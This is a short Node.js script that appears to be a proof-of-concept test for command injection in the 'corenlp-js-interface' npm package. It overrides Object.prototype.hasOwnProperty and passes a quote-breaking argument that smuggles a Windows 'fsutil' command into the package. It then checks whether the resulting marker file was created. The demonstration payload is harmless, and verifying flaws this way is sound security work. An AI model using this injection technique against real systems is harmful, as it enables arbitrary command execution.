Object.prototype.hasOwnProperty = () => true;
const a = require('corenlp-js-interface');
const fs = require('fs');
const path = './corenlp-js-interface';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
a('\') fsutil file createnew corenlp-js-interface 0 # \'', '', '', '');
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + true + ' }');
fs.unlink(path, function (err) {
});